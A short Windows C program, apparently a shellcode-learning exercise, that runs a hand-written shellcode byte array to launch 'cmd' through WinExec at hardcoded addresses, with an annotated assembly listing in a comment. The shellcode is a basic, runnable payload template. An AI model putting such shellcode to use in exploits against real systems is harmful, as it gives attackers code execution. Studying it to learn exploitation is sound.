#include "stdafx.h"
#include "windows.h"


char shellcode[] = "\xc6\x45\xfc\x63"
				   "\xc6\x45\xfd\x6d"
				   "\xc6\x45\xfe\x64"
				   "\xc6\x45\xff\x00"
				   "\x6a\x05"
				   "\x8d\x45\xfc"
				   "\x50"
				   "\xb8\xfd\xe5\xe3\x76"  // 주소값 변경 필요
				   "\xff\xd0"
				   "\x6a\x01"
				   "\xb8\x4f\x21\xe0\x76"  // 주소값 변경 필요
				   "\xff\xd0";

int _tmain(int argc, _TCHAR* argv[])
{
	int * shell = (int*)shellcode;
	__asm{
		jmp shell;
	}
}















/*
		// cmd
		mov		byte ptr [ebp-4], 63h
		mov		byte ptr [ebp-3], 6Dh
		mov		byte ptr [ebp-2], 64h
		mov		byte ptr [ebp-1], 0
		// call WinExec('cmd',SW_SHOW)
		push	5
		lea		eax, [ebp-4]
		push	eax
		mov		eax, 0x75bbe5fd
		call	eax
		// call ExitProcess(1)
		push	1
		mov		eax, 0x75b8214f
		call	eax
	};
}

*/